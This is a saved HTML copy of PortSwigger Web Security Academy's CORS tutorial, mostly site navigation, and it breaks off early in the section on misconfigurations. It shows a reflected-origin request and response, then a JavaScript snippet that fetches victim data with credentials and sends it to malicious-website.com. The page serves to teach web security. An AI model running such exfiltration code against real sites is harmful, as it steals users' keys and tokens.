@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<!-- saved from url=(0041)https://portswigger.net/web-security/cors -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+            <script type="text/javascript" async="" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-VQkqyzWECBbjdnrmLsMeQdf0TTXr6rfxgJXnIIszVBecGcFa03Tl4VBO4n2inOOm" nonce=""></script><script async="" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/analytics.js.download"></script><script type="text/javascript" async="" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/js" nonce=""></script><script type="text/javascript" async="" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/analytics.js.download" nonce=""></script><script async="" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/gtm.js.download"></script><script nonce="">
+        (function (w, d, s, l, i) {
+            w[l] = w[l] || [];
+            w[l].push({
+                'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'
+            });
+            var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
+            j.async = true;
+            j.src =
+                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+            f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-M4CF4TD');
+    </script>
+
+        
+        <meta content="IE=edge" http-equiv="X-UA-Compatible">
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <title>What is CORS (cross-origin resource sharing)? Tutorial &amp; Examples | Web Security Academy</title>
+        <meta name="description" content="In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, ...">
+        
+<script nonce="">
+    const dimensionName = "dimension2";
+    const userRef = "";
+</script>
+
+        <!-- Twitter data -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="What is CORS (cross-origin resource sharing)? Tutorial &amp; Examples | Web Security Academy">
+    <meta name="twitter:description" content="In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, ...">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="What is CORS (cross-origin resource sharing)? Tutorial &amp; Examples | Web Security Academy">
+    <meta property="og:description" content="In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, ...">
+<meta property="og:url" content="https://portswigger.net/web-security/cors">
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+<meta property="og:type" content="website">
+<link rel="canonical" href="https://portswigger.net/web-security/cors">
+<link rel="icon" href="https://portswigger.net/content/images/logos/favicon.ico" type="image/x-icon">
+<link rel="apple-touch-icon" href="https://portswigger.net/content/images/logos/apple-touch-icon.png">
+        <link href="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/psacademy.css" rel="stylesheet" type="text/css">
+        <link rel="preload" href="https://portswigger.net/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="https://portswigger.net/content/fonts/ps-main/ps-icons.woff?l1la2n" as="font" crossorigin="anonymous">
+    </head>
+    <body class="theme-">
+        
+
+
+        <header class="page-header" id="top">
+            <div class="container">
+    <a class="logo" href="https://portswigger.net/"></a>
+    <div class="header-right">
+        <div class="login-buttons">
+                <a class="button-orange-small" href="https://portswigger.net/users">Login</a>
+        </div>
+
+
+    <input type="checkbox" id="hamburger-mobile" class="hamburger-input-mobile">
+    <input type="radio" id="hamburger-desktop" class="hamburger-input-desktop" name="mega-nav-input">
+    <div class="hamburger-menu-mobile">
+        <label class="hamburger-menu-label header-hidden" for="hamburger-mobile" data-ga-click-label="hamburger-mobile">
+            <span class="hamburger-layers"></span>
+        </label>
+    </div>
+    <div class="mega-nav">
+        <input type="radio" id="mega-nav-close" class="mega-nav-input-close" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-1" class="mega-nav-input-1" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-2" class="mega-nav-input-2" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-6" class="mega-nav-input-6" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-7" class="mega-nav-input-7" name="mega-nav-input">
+
+        <label for="mega-nav-close" class="mega-nav-close"></label>
+
+        <label class="mega-nav-label mega-nav-label-1" for="mega-nav-label-1" data-ga-click-label="products">
+            <span class="mega-nav-text">Products</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <label class="mega-nav-label mega-nav-label-2" for="mega-nav-label-2" data-ga-click-label="solutions">
+            <span class="mega-nav-text">Solutions</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <a data-ga-click-label="research" class="mega-nav-link" href="https://portswigger.net/research"><span class="mega-nav-text">Research</span></a>
+        <a data-ga-click-label="academy" class="mega-nav-link" href="https://portswigger.net/web-security"><span class="mega-nav-text">Academy</span></a>
+        <a data-ga-click-label="dailyswig" class="mega-nav-link" href="https://portswigger.net/daily-swig"><span class="mega-nav-text">Daily Swig</span></a>
+        <label data-ga-click-label="support" class="mega-nav-label mega-nav-label-6" for="mega-nav-label-6">
+            <span class="mega-nav-text">Support</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+
+        <label class="mega-nav-label mega-nav-label-7 header-hidden" for="mega-nav-label-7" data-ga-click-label="company">
+            <span class="mega-nav-text">Company</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <div class="hamburger-menu-desktop">
+            <label class="hamburger-menu-label header-show" for="hamburger-desktop" data-ga-click-label="hamburger-desktop">
+                <span class="hamburger-layers"></span>
+            </label>
+            <div>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-1" href="https://portswigger.net/customers" data-ga-click-label="customers"><span class="mega-nav-text">Customers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-2" href="https://portswigger.net/burp/account-and-subscription-management" data-ga-click-label="how-to-buy"><span class="mega-nav-text">Accounts / Subscriptions</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-3" href="https://portswigger.net/about" data-ga-click-label="about"><span class="mega-nav-text">About</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-4" href="https://portswigger.net/blog" data-ga-click-label="blog"><span class="mega-nav-text">Blog</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-5" href="https://portswigger.net/careers" data-ga-click-label="careers"><span class="mega-nav-text">Careers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-6" href="https://portswigger.net/legal" data-ga-click-label="legal"><span class="mega-nav-text">Legal</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-7" href="https://portswigger.net/contact" data-ga-click-label="contact"><span class="mega-nav-text">Contact</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-8" href="https://portswigger.net/support/reseller-faqs" data-ga-click-label="contact"><span class="mega-nav-text">Resellers</span></a>
+            </div>
+        </div>
+
+        <a class="mega-nav-link header-hidden" href="https://portswigger.net/users/youraccount" data-ga-click-label="login-mobile"><span class="mega-nav-text">My account</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-1" href="https://portswigger.net/customers" data-ga-click-label="customers"><span class="mega-nav-text">Customers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-2" href="https://portswigger.net/burp/account-and-subscription-management" data-ga-click-label="how-to-buy"><span class="mega-nav-text">Accounts / Subscriptions</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-3" href="https://portswigger.net/about" data-ga-click-label="about"><span class="mega-nav-text">About</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-4" href="https://portswigger.net/blog" data-ga-click-label="blog"><span class="mega-nav-text">Blog</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-5" href="https://portswigger.net/careers" data-ga-click-label="careers"><span class="mega-nav-text">Careers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-6" href="https://portswigger.net/legal" data-ga-click-label="legal"><span class="mega-nav-text">Legal</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-7" href="https://portswigger.net/contact" data-ga-click-label="contact"><span class="mega-nav-text">Contact</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-8" href="https://portswigger.net/support/reseller-faqs" data-ga-click-label="contact"><span class="mega-nav-text">Resellers</span></a>
+
+        <div class="mega-nav-container">
+
+            <div class="mega-nav-content mega-nav-content-1">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <a href="https://portswigger.net/burp/enterprise" class="link-block-white" data-ga-click-label="product-enterprise">
+                                <img src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/enterprise.svg" alt="Burp Suite Enterprise Edition">
+                                <span><strong>Burp Suite Enterprise Edition</strong></span>
+                                <span>The enterprise-enabled dynamic web vulnerability scanner.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp/pro" class="link-block-white" data-ga-click-label="product-pro">
+                                <img src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/professional.svg" alt="Burp Suite Professional">
+                                <span><strong>Burp Suite Professional</strong></span>
+                                <span>The world's #1 web penetration testing toolkit.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp/communitydownload" class="link-block-white" data-ga-click-label="product-community">
+                                <img src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/community.svg" alt="Burp Suite Community Edition">
+                                <span><strong>Burp Suite Community Edition</strong></span>
+                                <span>The best manual tools to start web security testing.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp/dastardly" class="link-block-white" data-ga-click-label="product-community">
+                                <img src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/dastardly.svg" alt="Dastardly, from Burp Suite">
+                                <span><strong>Dastardly, from Burp Suite</strong></span>
+                                <span>Free, lightweight web application security scanning for CI/CD.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp" class="chevron-after" data-ga-click-label="products-all">View all product editions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/account-and-subscription-management" data-ga-click-label="feature-how-to-buy-burp-suite">
+                                    <p><strong>Account and subscription management</strong></p>
+                                    <p>Information on ordering, pricing, and more.</p>
+                                    <img src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/tailored-quote.png" alt="Burp Suite Professional vs Burp Suite Enterprise Edition">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-2">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="https://portswigger.net/solutions" class="link-block-white" data-ga-click-label="solutions-application-testing">
+                                    <span><strong>Application Security Testing</strong></span>
+                                    <span>See how our software enables the world to secure the web.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/devsecops" class="link-block-white" data-ga-click-label="solutions-devsecops">
+                                    <span><strong>DevSecOps</strong></span>
+                                    <span>Catch critical bugs; ship more secure software, more quickly.</span>
+                                </a>
+
+                                <a href="https://portswigger.net/solutions/penetration-testing" class="link-block-white" data-ga-click-label="solutions-penetration-testing">
+                                    <span><strong>Penetration Testing</strong></span>
+                                    <span>Accelerate penetration testing - find more bugs, more quickly.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/automated-security-testing" class="link-block-white" data-ga-click-label="solutions-automated-penetration-testing">
+                                    <span><strong>Automated Scanning</strong></span>
+                                    <span>Scale dynamic scanning. Reduce risk. Save time/money.</span>
+                                </a>
+
+                                <a href="https://portswigger.net/solutions/bug-bounty-hunting" class="link-block-white" data-ga-click-label="solutions-bug-bounty-software">
+                                    <span><strong>Bug Bounty Hunting</strong></span>
+                                    <span>Level up your hacking and earn more bug bounties.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/compliance" class="link-block-white" data-ga-click-label="solutions-compliance">
+                                    <span><strong>Compliance</strong></span>
+                                    <span>Enhance security monitoring to comply with confidence.</span>
+                                </a>
+                            </div>
+                            <a href="https://portswigger.net/solutions" class="chevron-after" data-ga-click-label="solutions-all">View all solutions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/enterprise/resources/enterprise-edition-vs-professional" data-ga-click-label="feature-product-burp-comparison">
+                                    <p><strong>Product comparison</strong></p>
+                                    <p>What's the difference between Pro and Enterprise Edition?</p>
+                                    <img src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/burp-suite.jpg" alt="Burp Suite Professional vs Burp Suite Enterprise Edition">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-6">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="https://portswigger.net/support" class="link-block-white" data-ga-click-label="support-center">
+                                    <span><strong>Support Center</strong></span>
+                                    <span>Get help and advice from our experts on all things Burp.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation" class="link-block-white" data-ga-click-label="support-documentation">
+                                    <span><strong>Documentation</strong></span>
+                                    <span>Tutorials and guides for Burp Suite.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation/desktop/getting-started" class="link-block-white" data-ga-click-label="support-get-started-professional">
+                                    <span><strong>Get Started - Professional</strong></span>
+                                    <span>Get started with Burp Suite Professional.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation/enterprise/getting-started" class="link-block-white" data-ga-click-label="support-get-started-enterprise">
+                                    <span><strong>Get Started - Enterprise</strong></span>
+                                    <span>Get started with Burp Suite Enterprise Edition.</span>
+                                </a>
+                                <a href="https://forum.portswigger.net/" class="link-block-white" data-ga-click-label="support-user-forum">
+                                    <span><strong>User Forum</strong></span>
+                                    <span>Get your questions answered in the User Forum.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/releases" class="link-block-white" data-ga-click-label="support-releases">
+                                    <span><strong>Downloads</strong></span>
+                                    <span>Download the latest version of Burp Suite.</span>
+                                </a>
+                            </div>
+                            <a href="https://portswigger.net/support" class="chevron-after" data-ga-click-label="support-all">Visit the Support Center</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/releases" data-ga-click-label="feature-burp-software-downloads">
+                                    <p><strong>Downloads</strong></p>
+                                    <p>Download the latest version of Burp Suite.</p>
+                                    <img src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/latest-burp-suite-software-download.jpg" alt="The latest version of Burp Suite software for download">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    </div>
+</div>
+        </header>
+        
+
+
+
+
+            <nav class="navigation-top">
+                <input type="checkbox" id="nav-main-enterprise">
+                <label for="nav-main-enterprise">
+                    <span>Academy home</span>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/index.html">Dashboard</a></li>
+                    <li><a href="https://portswigger.net/web-security/learning-path/index.html">Learning path</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-topics">
+                        <label for="nav-main-academy-topics">
+                            <span>Latest topics</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">Bypassing SameSite restrictions</a>
+                            <a href="https://portswigger.net/web-security/prototype-pollution">Client-side prototype pollution</a>
+                            <a href="https://portswigger.net/web-security/essential-skills">Essential skills</a>
+                            <a href="https://portswigger.net/web-security/request-smuggling/browser">Browser-powered request smuggling</a>
+                            <a href="https://portswigger.net/web-security/jwt">JWT attacks</a>
+                            <a href="https://portswigger.net/web-security/all-materials">View all topics</a>
+                        </div>
+                    </li>
+                    <li><a href="https://portswigger.net/web-security/all-labs">All labs</a></li>
+                    <li><a href="https://portswigger.net/web-security/mystery-lab-challenge">Mystery labs</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-hall-of-fame">
+                        <label for="nav-main-academy-hall-of-fame">
+                            <span>Hall of Fame</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="https://portswigger.net/web-security/hall-of-fame">Leaderboard</a>
+                            <a href="https://portswigger.net/web-security/getting-started/kamil-vavra/index.html">Interview - Kamil Vavra</a>
+                            <a href="https://portswigger.net/web-security/getting-started/johnny-villarreal/index.html">Interview - Johnny Villarreal</a>
+                            <a href="https://portswigger.net/web-security/getting-started/andres-rauschecker/index.html">Interview - Andres Rauschecker</a>
+                        </div>
+                    </li>
+                    <li><a href="https://portswigger.net/web-security/getting-started/index.html">Get started</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-certification">
+                        <label for="nav-main-academy-certification">
+                             <span>Get certified</span>
+                             <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                             <a href="https://portswigger.net/web-security/certification/index.html">Get certified</a>
+                             <a href="https://portswigger.net/web-security/certification/how-to-prepare/index.html">How to prepare</a>
+                             <a href="https://portswigger.net/web-security/certification/how-it-works/index.html">How it works</a>
+                             <a href="https://portswigger.net/web-security/certification/practice-exam/index.html">Practice exam</a>
+                             <a href="https://portswigger.net/web-security/certification/exam-hints-and-guidance/index.html">Exam hints and guidance</a>
+                             <a href="https://portswigger.net/web-security/certification/how-it-works/index.html#what-the-exam-involves">What the exam involves</a>
+                             <a href="https://portswigger.net/web-security/certification/frequently-asked-questions/index.html">FAQs</a>
+                             <a href="https://portswigger.net/web-security/certification#validate-your-certification">Validate your certification</a>
+                        </div>
+                    </li>
+                </ul>
+            </nav>
+        <ol class="container ps-breadcrumbs" itemscope="" itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem"><a itemscope="" itemtype="http://schema.org/Thing" itemprop="item" href="https://portswigger.net/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1"></li><li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem"><a itemscope="" itemtype="http://schema.org/Thing" itemprop="item" href="https://portswigger.net/web-security/cors"><span itemprop="name">CORS</span></a><meta itemprop="position" content="2"></li></ol>        <section class="maincontainer">
+                <div class="container is-flex">
+                    <div class="maincol">
+                        
+    <h1><nr-sentence class="nr-s0" id="nr-s0" page="0">Cross-origin resource sharing (CORS)</nr-sentence></h1>
+
+
+
+<div class="sharebuttoncontainer is-smallicons">
+    <a href="https://twitter.com/share?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcors&amp;text=What+is+CORS+(cross-origin+resource+sharing)%3f+Tutorial+%26amp%3b+Examples+%7c+Web+Security+Academy%0A" target="_blank" data-ga-click-label="twitter">
+        <span class="share-twitter ">
+            <span class="share-icon icon-ps-twitter"></span>
+            <span class="share-text">Twitter</span>
+        </span>
+    </a>
+    <a href="https://api.whatsapp.com/send?text=https%3a%2f%2fportswigger.net%2fweb-security%2fcors" target="_blank" data-ga-click-label="whatsapp">
+        <span class="share-whatsapp ">
+            <span class="share-icon icon-ps-whatsapp"></span>
+            <span class="share-text">WhatsApp</span>
+        </span>
+    </a>
+    <a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fportswigger.net%2fweb-security%2fcors" target="_blank" data-ga-click-label="facebook">
+        <span class="share-facebook ">
+            <span class="share-icon icon-ps-facebook"></span>
+            <span class="share-text">Facebook</span>
+        </span>
+    </a>
+    <a href="https://reddit.com/submit?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcors" target="_blank" data-ga-click-label="reddit">
+        <span class="share-reddit ">
+            <span class="share-icon icon-ps-reddit"></span>
+            <span class="share-text">Reddit</span>
+        </span>
+    </a>
+    <a href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcors" target="_blank" data-ga-click-label="linkedin">
+        <span class="share-linkedin ">
+            <span class="share-icon icon-ps-linkedin"></span>
+            <span class="share-text">LinkedIn</span>
+        </span>
+    </a>
+    <a href="mailto:?subject=What+is+CORS+(cross-origin+resource+sharing)%3f+Tutorial+%26amp%3b+Examples+%7c+Web+Security+Academy&amp;body=What+is+CORS+(cross-origin+resource+sharing)%3f+Tutorial+%26amp%3b+Examples+%7c+Web+Security+Academy%0A%0Ahttps://portswigger.net/web-security/cors" data-ga-click-label="email">
+        <span class="share-email ">
+            <span class="share-icon icon-ps-email"></span>
+            <span class="share-text">Email</span>
+        </span>
+    </a>
+</div>
+<p><nr-sentence class="nr-s1" id="nr-s1" page="0">
+		    In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, and discuss how to protect against these attacks.</nr-sentence><nr-sentence class="nr-s2" id="nr-s2" page="0"> This topic was written
+			in collaboration with PortSwigger Research, who popularized this attack class with the presentation </nr-sentence><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties"><nr-sentence class="nr-s2" id="nr-s2" page="0">Exploiting CORS misconfigurations for Bitcoins and bounties</nr-sentence></a><nr-sentence class="nr-s2" id="nr-s2" page="0">.</nr-sentence>
+	    </p>
+		<h2 id="what-is-cors-cross-origin-resource-sharing"><nr-sentence class="nr-s3" id="nr-s3" page="0">What is CORS (cross-origin resource sharing)?</nr-sentence></h2>
+		<p><nr-sentence class="nr-s4" id="nr-s4" page="0">
+			Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain.</nr-sentence><nr-sentence class="nr-s5" id="nr-s5" page="0"> It extends and adds flexibility to the same-origin policy (</nr-sentence><a href="https://portswigger.net/web-security/cors/same-origin-policy"><nr-sentence class="nr-s5" id="nr-s5" page="0">SOP</nr-sentence></a><nr-sentence class="nr-s5" id="nr-s5" page="0">).</nr-sentence><nr-sentence class="nr-s6" id="nr-s6" page="0"> However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented.</nr-sentence><nr-sentence class="nr-s7" id="nr-s7" page="0"> CORS is not a protection against cross-origin attacks such as </nr-sentence><a href="https://portswigger.net/web-security/csrf"><nr-sentence class="nr-s7" id="nr-s7" page="0">cross-site request forgery</nr-sentence></a><nr-sentence class="nr-s7" id="nr-s7" page="0"> (</nr-sentence><a href="https://portswigger.net/web-security/csrf"><nr-sentence class="nr-s7" id="nr-s7" page="0">CSRF</nr-sentence></a><nr-sentence class="nr-s7" id="nr-s7" page="0">).</nr-sentence>
+		</p>
+		<img alt="CORS" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/attack-on-cors.svg">
+		<div class="component-links">
+			<h4><nr-sentence class="nr-s8" id="nr-s8" page="0">Labs</nr-sentence></h4>
+			<p><nr-sentence class="nr-s9" id="nr-s9" page="0">
+				If you're already familiar with the basic concepts behind CORS vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.</nr-sentence>
+			</p>
+			<a href="https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors"><nr-sentence class="nr-s10" id="nr-s10" page="0">View all CORS labs</nr-sentence></a>
+		</div>
+		<h2 id="same-origin-policy"><nr-sentence class="nr-s11" id="nr-s11" page="0">Same-origin policy</nr-sentence></h2>
+		<p><nr-sentence class="nr-s12" id="nr-s12" page="0">
+			The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.</nr-sentence><nr-sentence class="nr-s13" id="nr-s13" page="0"> The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another.</nr-sentence><nr-sentence class="nr-s14" id="nr-s14" page="0"> It generally allows a domain to issue requests to other domains, but not to access the responses.</nr-sentence>
+	    </p>
+		  <div class="component-links">
+            <h4><nr-sentence class="nr-s15" id="nr-s15" page="0">Read more</nr-sentence></h4>
+            <a href="https://portswigger.net/web-security/cors/same-origin-policy"><nr-sentence class="nr-s15" id="nr-s15" page="0">Same-origin policy</nr-sentence></a>
+        </div>
+		<h2 id="relaxation-of-the-same-origin-policy"><nr-sentence class="nr-s16" id="nr-s16" page="0">Relaxation of the same-origin policy</nr-sentence></h2>
+		<p><nr-sentence class="nr-s17" id="nr-s17" page="0">
+		    The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints.</nr-sentence><nr-sentence class="nr-s18" id="nr-s18" page="0"> Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access.</nr-sentence><nr-sentence class="nr-s19" id="nr-s19" page="0"> A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).</nr-sentence>
+	    </p>
+		<p><nr-sentence class="nr-s20" id="nr-s20" page="0">
+			The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted.</nr-sentence><nr-sentence class="nr-s21" id="nr-s21" page="0"> These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.</nr-sentence>
+		</p>
+		 <div class="component-links">
+            <h4><nr-sentence class="nr-s22" id="nr-s22" page="0">Read more</nr-sentence></h4>
+			 <a href="https://portswigger.net/web-security/cors/access-control-allow-origin"><nr-sentence class="nr-s22" id="nr-s22" page="0">CORS and the Access-Control-Allow-Origin response header</nr-sentence></a>
+        </div>
+		<h2 id="vulnerabilities-arising-from-cors-configuration-issues"><nr-sentence class="nr-s23" id="nr-s23" page="0"><nr-word class="nr-s23w0">Vulnerabilities</nr-word> arising from CORS configuration issues</nr-sentence></h2>
+		<p><nr-sentence class="nr-s24" id="nr-s24" page="0">
+			Many modern websites use CORS to allow access from subdomains and trusted third parties.</nr-sentence><nr-sentence class="nr-s25" id="nr-s25" page="0"> Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.</nr-sentence>
+		</p>
+		<h3 id="server-generated-acao-header-from-client-specified-origin-header"><nr-sentence class="nr-s26" id="nr-s26" page="0">Server-generated </nr-sentence><a href="https://portswigger.net/web-security/cors/access-control-allow-origin"><nr-sentence class="nr-s26" id="nr-s26" page="0">ACAO</nr-sentence></a><nr-sentence class="nr-s26" id="nr-s26" page="0"> header from client-specified Origin header</nr-sentence></h3>
+		<p><nr-sentence class="nr-s27" id="nr-s27" page="0">
+			Some applications need to provide access to a number of other domains.</nr-sentence><nr-sentence class="nr-s28" id="nr-s28" page="0"> Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality.</nr-sentence><nr-sentence class="nr-s29" id="nr-s29" page="0"> So some applications take the easy route of effectively allowing access from any other domain.</nr-sentence>
+		</p>
+		<p><nr-sentence class="nr-s30" id="nr-s30" page="0">
+			One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed.</nr-sentence><nr-sentence class="nr-s31" id="nr-s31" page="0"> For example, consider an application that receives the following request:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s32" id="nr-s32" page="0">GET /sensitive-victim-data HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://malicious-website.com
+Cookie: sessionid=...</nr-sentence></code>
+		<p><nr-sentence class="nr-s33" id="nr-s33" page="0">
+			It then responds with:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s34" id="nr-s34" page="0">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://malicious-website.com
+Access-Control-Allow-Credentials: true
+...</nr-sentence></code>
+		<p><nr-sentence class="nr-s35" id="nr-s35" page="0">
+			These headers state that access is allowed from the requesting domain (</nr-sentence><code><nr-sentence class="nr-s35" id="nr-s35" page="0">malicious-website.com</nr-sentence></code><nr-sentence class="nr-s35" id="nr-s35" page="0">) and that the cross-origin requests can include cookies (</nr-sentence><code><nr-sentence class="nr-s35" id="nr-s35" page="0">Access-Control-Allow-Credentials: true</nr-sentence></code><nr-sentence class="nr-s35" id="nr-s35" page="0">) and so will be processed in-session.</nr-sentence>
+		</p>
+		<p><nr-sentence class="nr-s36" id="nr-s36" page="0">
+			Because the application reflects arbitrary origins in the </nr-sentence><code><nr-sentence class="nr-s36" id="nr-s36" page="0">Access-Control-Allow-Origin</nr-sentence></code><nr-sentence class="nr-s36" id="nr-s36" page="0"> header, this means that absolutely any domain can access resources from the vulnerable domain.</nr-sentence><nr-sentence class="nr-s37" id="nr-s37" page="0"> If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s38" id="nr-s38" page="0">var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();</nr-sentence><nr-sentence class="nr-s39" id="nr-s39" page="0">
+
+function reqListener() {
+   location='//malicious-website.com/log?key='+this.responseText;
+};</nr-sentence></code>
+		
+
+    <div class="widgetcontainer-lab-link " id="3c3123251c8faea3353dafdf70678f6d9241bbcdda2f8772ce17fb4dee20ca0d">
+        <span><nr-sentence class="nr-s40" id="nr-s40" page="0">LAB</nr-sentence></span>
+        <div class="flex-columns">
